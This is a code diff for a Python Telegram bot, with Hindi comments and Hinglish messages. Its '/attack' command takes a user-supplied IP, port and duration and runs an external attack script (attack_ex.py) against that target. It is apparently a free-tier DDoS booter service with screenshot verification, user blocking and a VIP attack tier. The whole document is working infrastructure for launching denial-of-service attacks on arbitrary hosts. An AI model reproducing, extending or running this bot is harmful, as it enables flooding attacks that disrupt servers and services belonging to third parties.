@@ -338,26 +338,34 @@ def redeem_key(message):
 # ✅ Handle "/attack" Command
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    user_id = message.from_user.id
-    command = message.text.split()
+    user_id = str(message.from_user.id)
+    first_name = message.from_user.first_name  
+    username = message.from_user.username  
 
-    if message.chat.id != int(GROUP_ID):
+    # ✅ सिर्फ ग्रुप में काम करेगा  
+    if str(message.chat.id) != GROUP_ID:
         bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
         return
 
-    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो
+    # ✅ पहले चेक करो कि यूज़र ब्लॉक है या नहीं  
+    if user_id in blocked_users:
+        bot.reply_to(message, f"🚫 **AAP BLOCK HO CHUKE HO! SCREENSHOT BHEJNE TAK ATTACK NAHI KAR SAKTE!**")
+        return
+
+    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो  
     if user_id in pending_verification:
-        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
+        bot.reply_to(message, f"🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
         return
 
-    # ✅ अटैक लिमिट चेक करो
-    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
-    if user_active_attacks >= MAX_ATTACKS:
-        bot.reply_to(message, f"⚠️ **ATTACK LIMIT ({MAX_ATTACKS}) POORI HO CHUKI HAI!**\n👉 **PEHLE PURANE KHATAM HONE DO! /check KARO!**")
-        return
-
-    if len(command) != 4:
-        bot.reply_to(message, "⚠️ **FREE USAGE:** `/attack <IP> <PORT> <TIME>`")
+    # ✅ सही कमांड फॉर्मेट चेक करें  
+    command = message.text.split()
+    
+    if len(command) == 1 or len(command) != 4:  
+        bot.reply_to(message, 
+            "⚠ **USAGE:** `/attack <IP> <PORT> <TIME>`\n\n"
+            "🔹 **Example:** `/attack 1.1.1.1 8080 60`",
+            parse_mode="Markdown"
+        )
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -366,87 +374,84 @@ def handle_attack(message):
         port = int(port)
         time_duration = int(time_duration)
     except ValueError:
-        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
+        bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
         return
 
     if time_duration > 100:
-        bot.reply_to(message, "🚫 **100S SE ZYADA ALLOWED NAHI HAI!**")
+        bot.reply_to(message, "🚫 **FREE ATTACK TIME 100 SECONDS HAI!**")
         return
 
-    # ✅ स्क्रीनशॉट वेरिफिकेशन स्टार्ट
+    # ✅ स्क्रीनशॉट वेरिफिकेशन स्टार्ट  
     pending_verification[user_id] = True  
 
     bot.send_message(
         message.chat.id,
-        f"📸 **TURANT SCREENSHOT BHEJ!**\n"
+        f"📸 **{first_name} ({'@' + username if username else 'No Username'})! TURANT SCREENSHOT BHEJ!**\n"
         f"⚠️ **AGAR 2 MINUTE ME NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
         parse_mode="Markdown"
     )
 
-    # ✅ अटैक स्टार्ट
-    start_time = datetime.datetime.now()
-    end_time = start_time + datetime.timedelta(seconds=time_duration)
-    active_attacks[user_id] = (target, port, end_time)
-
-    bot.send_message(
-        message.chat.id,
-        f"🔥 **ATTACK DETAILS** 🔥\n\n"
-        f"👤 **USER:** `{user_id}`\n"
-        f"🎯 **TARGET:** `{target}`\n"
-        f"📍 **PORT:** `{port}`\n"
-        f"⏳ **DURATION:** `{time_duration} SECONDS`\n"
-        f"🕒 **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
-        f"🚀 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n"
-        f"📸 **NOTE:** **TURANT SCREENSHOT BHEJO, WARNA NEXT ATTACK BLOCK HO JAYEGA!**\n\n"
-        f"⚠️ **ATTACK CHALU HAI! /check KARKE STATUS DEKHO!**",
-        parse_mode="Markdown"
-    )
-
-    # ✅ 2 मिनट बाद चेक करो कि यूजर ने स्क्रीनशॉट भेजा या नहीं
+    # ✅ 2 मिनट बाद चेक करो कि यूजर ने स्क्रीनशॉट भेजा या नहीं  
     def check_screenshot():
-        import time
-        time.sleep(120)  # 2 मिनट वेट करें
+        time.sleep(120)  # 2 मिनट वेट करें  
         if user_id in pending_verification:  
+            blocked_users.add(user_id)  # ✅ यूजर को सच में ब्लॉक कर दो  
             del pending_verification[user_id]  
             bot.send_message(
                 message.chat.id,
-                "🚫 **2 MINUTE HO GAYE! SCREENSHOT NAHI BHEJA! NEXT ATTACK BLOCK HO GAYA!** ❌",
+                f"🚫 **{first_name} ({'@' + username if username else 'No Username'}) 2 MINUTE ME SCREENSHOT NAHI DIYA! NEXT ATTACK BLOCK HO CHUKA HAI!** ❌",
                 parse_mode="Markdown"
             )
 
-    threading.Thread(target=check_screenshot).start()
+    threading.Thread(target=check_screenshot, daemon=True).start()
 
-    # ✅ Attack Execution Function
-    def attack_execution():
+    # ✅ Attack Execution Function  
+    def execute_attack():
         try:
-            subprocess.run(f"python3 free.py {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
-        except subprocess.CalledProcessError:
-            bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
-        finally:
-            bot.send_message(
-                message.chat.id,
-                "✅ **ATTACK KHATAM HO GAYA!** 🎯",
+            subprocess.Popen(["python3", "attack_ex.py", target, str(port), str(time_duration)])
+            bot.reply_to(message, 
+                f"🚀 **Attack Started by {first_name} ({'@' + username if username else 'No Username'})!**\n"
+                f"🎯 **Target:** `{target}`\n"
+                f"🔢 **Port:** `{port}`\n"
+                f"⏳ **Duration:** `{time_duration}s`", 
                 parse_mode="Markdown"
             )
-            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर
 
-    threading.Thread(target=attack_execution).start()
+            time.sleep(time_duration)
+            bot.send_message(message.chat.id, 
+                f"✅ **Attack Finished!**\n"
+                f"👤 **User:** {first_name} ({'@' + username if username else 'No Username'})\n"
+                f"🎯 **Target:** `{target}`\n"
+                f"🔢 **Port:** `{port}`", 
+                parse_mode="Markdown"
+            )
+
+        except Exception as e:
+            bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
+
+    threading.Thread(target=execute_attack, daemon=True).start()
 
 
-# ✅ Handle Screenshot Verification
+# ✅ **अब स्क्रीनशॉट को वेरिफाई और फॉरवर्ड करने का सिस्टम**  
 @bot.message_handler(content_types=['photo'])
 def verify_screenshot(message):
-    user_id = message.from_user.id
+    user_id = str(message.from_user.id)
 
-    if user_id not in pending_verification:
-        bot.reply_to(message, "❌ **TU ABHI KOI ATTACK NAHI KARA RAHA! SCREENSHOT FALTU MAT BHEJ!**")
-        return
+    if user_id in pending_verification:
+        del pending_verification[user_id]  # ✅ यूजर को अनब्लॉक करें  
+        if user_id in blocked_users:
+            blocked_users.remove(user_id)  # ✅ अगर ब्लॉक था, तो हटा दो  
 
-    file_id = message.photo[-1].file_id
-    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")
+        bot.send_message(
+            message.chat.id,
+            "✅ **SCREENSHOT VERIFIED! AAPKA NEXT ATTACK ALLOWED HAI!**",
+            parse_mode="Markdown"
+        )
 
-    del pending_verification[user_id]  # ✅ अब यूजर दुबारा अटैक कर सकता है
-    bot.reply_to(message, "✅ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")
+        # ✅ Screenshot को फॉरवर्ड करना  
+        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
+    else:
+        bot.reply_to(message, "❌ **KOI PENDING VERIFICATION NAHI MILI!**")
 
 #  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
 @bot.message_handler(commands=['bgmi'])
